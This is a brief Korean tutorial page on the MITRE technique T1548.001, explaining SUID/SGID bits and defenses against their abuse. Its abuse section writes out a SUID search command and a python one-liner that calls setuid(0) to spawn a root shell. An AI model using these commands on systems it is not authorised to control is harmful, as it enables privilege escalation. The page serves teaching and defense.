T1548.001: Setuid and Setgid

Privilege Escalation

Setuid and Setgid

파일에 새겨진 "관리자 권한으로 실행" 도장을 악용하는 기법

#1. SUID/SGID란?

"임시 VIP 카드" 비유

일반 직원이 비밀번호를 변경하려면 관리자만 수정할 수 있는 파일(/etc/shadow)에 접근해야 합니다. 이때 passwd 명령에 SUID 비트가 설정되어 있으면, 실행하는 동안만 "파일 소유자(root)의 권한"으로 동작합니다. 마치 작업 중에만 임시 VIP 카드를 빌려주는 것과 같습니다.

SUID 비트의 동작

1chmod 4755 file → SUID 설정 (소유자 권한으로 실행)
2chmod 2755 file → SGID 설정 (그룹 권한으로 실행)
3ls -la에서 -rws로 표시 (x 대신 s)
# 정상적인 SUID 바이너리 예시
$ ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 /usr/bin/passwd
# rws의 's'가 SUID 비트 → 누가 실행해도 root 권한으로 동작

#2. SUID 악용 기법

비정상 SUID 바이너리 탐색 & 악용

공격자는 find / -perm -4000으로 SUID가 설정된 모든 파일을 검색합니다. 관리자가 실수로 SUID를 설정한 바이너리(bash, python, nmap 등)가 있으면 즉시 root 셸을 획득할 수 있습니다.

SUID bash 악용

$ find / -perm -4000 2>/dev/null
/usr/local/bin/custom-backup
$ /usr/local/bin/custom-backup
# whoami → root

SUID python 악용

# python에 SUID가 설정된 경우
$ python3 -c 'import os;
  os.setuid(0); os.system("/bin/bash")'
# root shell obtained

방어 방법

  • SUID 감사: 정기적으로 find / -perm -4000을 실행해 비정상 SUID 파일 탐지
  • nosuid 마운트: /tmp, /home 등에 nosuid 옵션으로 SUID 실행 차단
  • 최소 권한 원칙: SUID 대신 Linux capabilities 사용 권장
